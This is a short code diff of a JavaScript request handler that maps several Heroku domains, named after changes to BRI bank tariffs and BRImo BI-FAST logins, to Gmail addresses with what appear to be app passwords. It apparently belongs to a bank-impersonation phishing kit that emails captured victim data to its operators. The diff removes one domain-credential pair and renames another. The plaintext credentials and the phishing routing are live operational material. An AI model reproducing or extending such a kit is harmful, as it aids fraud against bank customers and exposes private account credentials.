@@ -15,12 +15,8 @@ export default function handler(req, res) {
     } else if(url == 'tarifbri-baru-lama.herokuapp.com'){
         email = 'jakarta12zx@gmail.com' ;
         pass = 'ijrwylcjdzswcfnj' ;
-
-    } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
-        email = 'brigacor80@gmail.com';
-        pass = 'zhzcfhbdtzipldsz';
         
-    } else if(url == 'perubahantarif-baru.herokuapp.com'){
+    } else if(url == 'perobahan-tarif.herokuapp.com'){
         email = 'samsudin19.01.12@gmail.com';
         pass = 'nsozbvpgogzlfeqg';
 
